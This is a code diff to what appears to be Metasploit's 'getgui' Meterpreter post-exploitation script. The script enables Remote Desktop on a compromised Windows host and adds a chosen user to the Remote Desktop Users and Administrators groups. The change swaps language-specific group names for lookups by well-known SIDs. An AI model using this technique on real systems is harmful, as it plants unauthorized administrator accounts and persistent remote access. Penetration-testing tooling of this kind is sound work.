@@ -21,7 +21,6 @@ logs = ::File.join(Msf::Config.log_directory,'scripts', 'getgui')
 @@exec_opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu." ],
 	"-e" => [ false, "Enable RDP only." ],
-	"-l" => [ true, "The language switch\n\t\tPossible Options: 'de_DE', 'en_EN' / default is: 'en_EN'" ],
 	"-p" => [ true,  "The Password of the user to add." ],
 	"-u" => [ true,  "The Username of the user to add." ],
 	"-f" => [ true,  "Forward RDP Connection." ]
@@ -35,23 +34,6 @@ def usage
 end
 
 
-def langdetect(lang)
-	if lang != nil
-		print_status("Language set by user to: '#{lang}'")
-	else
-		print_status("Language detection started")
-		lang = client.sys.config.sysinfo['System Language']
-		if lang != nil
-			print_status("\tLanguage detected: #{lang}")
-		else
-			print_error("\tLanguage detection failed, falling back to default 'en_EN'")
-			lang = "en_EN"
-		end
-	end
-	return lang
-rescue::Exception => e
-	print_status("The following Error was encountered: #{e.class} #{e}")
-end
 
 
 def enablerd()
@@ -100,26 +82,11 @@ end
 
 
 
-def addrdpusr(session, username, password, lang)
-	# Changing the group names depending on the selected language
-	case lang
-	when "en_EN"
-		rdu = "Remote Desktop Users"
-		admin = "Administrators"
-	when "en_US"
-		rdu = "Remote Desktop Users"
-		admin = "Administrators"
-	when "de_DE"
-		rdu = "Remotedesktopbenutzer"
-		admin = "Administratoren"
-	when "fr_FR"
-		rdu = "Utilisateurs du Bureau � distance"
-		admin = "Administrateurs"
-	else
-		print_error("Could not determine lenguage, defaulting to English!")
-		rdu = "Remote Desktop Users"
-		admin = "Administrators"
-	end
+def addrdpusr(session, username, password)
+		
+	rdu = resolve_sid("S-1-5-32-555")[:name]
+	admin = resolve_sid("S-1-5-32-544")[:name]
+
 
 	print_status "Setting user account for logon"
 	print_status "\tAdding User: #{username} with Password: #{password}"
@@ -159,8 +126,6 @@ frwrd = nil
 		pass = val
 	when "-h"
 		usage
-	when "-l"
-		lang = val
 	when "-f"
 		frwrd = true
 		lport = val
@@ -178,8 +143,8 @@ if client.platform =~ /win32|win64/
 				enabletssrv()
 			end
 			if usr and pass
-				lang = langdetect(lang)
-				addrdpusr(session, usr, pass, lang)
+				
+				addrdpusr(session, usr, pass)
 			end
 			if frwrd == true
 				print_status("Starting the port forwarding at local port #{lport}")
